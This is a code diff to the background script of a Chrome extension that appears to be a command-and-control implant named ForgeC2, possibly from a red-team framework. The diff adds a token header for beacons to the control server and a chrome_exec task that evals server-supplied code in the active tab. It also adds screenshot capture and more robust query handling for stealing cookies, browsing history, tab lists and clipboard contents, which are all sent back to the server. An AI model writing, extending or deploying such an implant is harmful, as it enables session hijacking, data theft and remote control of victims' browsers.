@@ -1,4 +1,5 @@
 const C2_SERVER = "<C2_SERVER>";
+const C2_TOKEN = "<C2_TOKEN>";
 const STORAGE_KEY = "forge_c2";
 const ALARM_NAME = "forge_c2_beacon";
 
@@ -8,18 +9,6 @@ function generateUUID() {
 
 function randomInt(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function b64encode(str) {
-  return btoa(unescape(encodeURIComponent(str)));
-}
-
-function b64decode(str) {
-  try {
-    return decodeURIComponent(escape(atob(str)));
-  } catch {
-    return atob(str);
-  }
 }
 
 chrome.runtime.onInstalled.addListener(async () => {
@@ -51,12 +40,24 @@ async function getC2Server() {
   return (data[STORAGE_KEY] && data[STORAGE_KEY].c2_server) || C2_SERVER;
 }
 
+function beaconHeaders() {
+  const headers = { "Content-Type": "application/json" };
+  if (C2_TOKEN && C2_TOKEN.indexOf("<C2_TOKEN>") === -1 && C2_TOKEN.length > 0) {
+    headers["X-ForgeC2-Chrome-Token"] = C2_TOKEN;
+  }
+  return headers;
+}
+
 async function doBeacon() {
   try {
     const data = await chrome.storage.local.get(STORAGE_KEY);
     const state = data[STORAGE_KEY] || {};
     const uuid = state.uuid;
     const c2 = state.c2_server || C2_SERVER;
+    if (!uuid || !c2 || String(c2).indexOf("<C2_SERVER>") !== -1) {
+      console.warn("[C2] beacon skipped: missing uuid or C2 server URL");
+      return;
+    }
 
     const pendingResults = state.results || [];
     const info = state.info || {};
@@ -69,7 +70,7 @@ async function doBeacon() {
 
     const resp = await fetch(c2 + "/api/chrome/beacon", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: beaconHeaders(),
       body: JSON.stringify(beacon),
     });
 
@@ -78,7 +79,6 @@ async function doBeacon() {
       return;
     }
 
-    // Clear sent results
     state.results = [];
     await chrome.storage.local.set({ [STORAGE_KEY]: state });
 
@@ -93,35 +93,87 @@ async function doBeacon() {
   }
 }
 
+async function activeTabId() {
+  const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
+  if (tabs.length > 0 && tabs[0].id != null) {
+    return tabs[0].id;
+  }
+  const any = await chrome.tabs.query({ active: true });
+  if (any.length > 0 && any[0].id != null) {
+    return any[0].id;
+  }
+  return null;
+}
+
+async function evalInTab(tabId, code) {
+  const results = await chrome.scripting.executeScript({
+    target: { tabId: tabId },
+    world: "MAIN",
+    func: (src) => {
+      // eslint-disable-next-line no-eval
+      return eval(src);
+    },
+    args: [code],
+  });
+  if (!results || results.length === 0) {
+    return "";
+  }
+  try {
+    return JSON.stringify(results.map((r) => r.result));
+  } catch {
+    return String(results[0] && results[0].result);
+  }
+}
+
 async function executeTask(task, c2) {
   let result = { task_id: task.id, type: task.type, output: "", error: "" };
 
   try {
     switch (task.type) {
+      case "chrome_c2": {
+        const data = await chrome.storage.local.get(STORAGE_KEY);
+        const state = data[STORAGE_KEY] || {};
+        result.output = JSON.stringify({
+          uuid: state.uuid || "",
+          version: chrome.runtime.getManifest().version,
+          info: state.info || {},
+        });
+        break;
+      }
+
       case "chrome_exec": {
-        if (typeof navigator !== "undefined" && navigator && navigator.serviceWorker) {
-          result.output = "exec not available in service worker context";
-        } else {
-          result.output = "exec not supported";
+        const code = task.command || task.data || "";
+        if (!code) {
+          result.error = "no command provided";
+          break;
         }
+        const tabId = await activeTabId();
+        if (tabId == null) {
+          result.error = "no active tab found";
+          break;
+        }
+        result.output = await evalInTab(tabId, code);
         break;
       }
 
       case "chrome_script": {
-        const scriptUrl = c2 + "/api/chrome/script/" + task.id;
-        const scriptResp = await fetch(scriptUrl);
-        if (!scriptResp.ok) throw new Error("script fetch failed: " + scriptResp.status);
-        const code = await scriptResp.text();
-        const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
-        if (tabs.length > 0) {
-          const results = await chrome.scripting.executeScript({
-            target: { tabId: tabs[0].id },
-            func: new Function(code),
-          });
-          result.output = JSON.stringify(results);
-        } else {
-          result.output = "no active tab found";
+        let code = task.data || task.command || "";
+        if (!code) {
+          result.error = "no script provided";
+          break;
         }
+        const tabId = await activeTabId();
+        if (tabId == null) {
+          result.error = "no active tab found";
+          break;
+        }
+        result.output = await evalInTab(tabId, code);
+        break;
+      }
+
+      case "chrome_screenshot": {
+        const dataUrl = await chrome.tabs.captureVisibleTab({ format: "png" });
+        result.output = dataUrl || "";
         break;
       }
 
@@ -143,6 +195,8 @@ async function executeTask(task, c2) {
         } else if (op === "list") {
           const all = await chrome.storage.local.get(null);
           result.output = JSON.stringify(Object.keys(all));
+        } else {
+          result.error = "unknown storage op: " + op;
         }
         break;
       }
@@ -170,7 +224,12 @@ async function executeTask(task, c2) {
 
       case "chrome_history": {
         if (chrome.history) {
-          const query = task.query || { text: "", maxResults: 50 };
+          let query = { text: "", maxResults: 50 };
+          if (task.query) {
+            try { query = Object.assign(query, JSON.parse(task.query)); } catch { /* keep default */ }
+          } else if (task.command) {
+            query.text = task.command;
+          }
           const items = await chrome.history.search(query);
           result.output = JSON.stringify(items);
         } else {
@@ -181,7 +240,12 @@ async function executeTask(task, c2) {
 
       case "chrome_cookies": {
         if (chrome.cookies) {
-          const details = task.details ? JSON.parse(task.details) : {};
+          let details = {};
+          if (task.details) {
+            try { details = JSON.parse(task.details); } catch { /* keep empty */ }
+          } else if (task.path) {
+            details.domain = task.path;
+          }
           const cookies = await chrome.cookies.getAll(details);
           result.output = JSON.stringify(cookies);
         } else {
@@ -191,7 +255,10 @@ async function executeTask(task, c2) {
       }
 
       case "chrome_tabs": {
-        const query = task.query ? JSON.parse(task.query) : {};
+        let query = {};
+        if (task.query) {
+          try { query = JSON.parse(task.query); } catch { /* keep empty */ }
+        }
         const tabs = await chrome.tabs.query(query);
         result.output = JSON.stringify(tabs);
         break;
@@ -203,14 +270,14 @@ async function executeTask(task, c2) {
           if (typeof navigator !== "undefined" && navigator.clipboard) {
             result.output = await navigator.clipboard.readText();
           } else {
-            result.output = "clipboard read not available";
+            result.output = "clipboard read not available in service worker; use chrome_exec in a tab";
           }
         } else if (op === "set") {
           if (typeof navigator !== "undefined" && navigator.clipboard) {
             await navigator.clipboard.writeText(task.data || "");
             result.output = "ok";
           } else {
-            result.output = "clipboard write not available";
+            result.output = "clipboard write not available in service worker";
           }
         }
         break;
@@ -235,7 +302,6 @@ async function executeTask(task, c2) {
     result.error = err.message || String(err);
   }
 
-  // Store result for next beacon
   const data = await chrome.storage.local.get(STORAGE_KEY);
   const state = data[STORAGE_KEY] || {};
   if (!state.results) state.results = [];
@@ -243,7 +309,6 @@ async function executeTask(task, c2) {
   await chrome.storage.local.set({ [STORAGE_KEY]: state });
 }
 
-// expose forceBeacon for popup
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
   if (msg.type === "force_beacon") {
     doBeacon().then(() => sendResponse({ status: "ok" })).catch(e => sendResponse({ status: "error", error: e.message }));
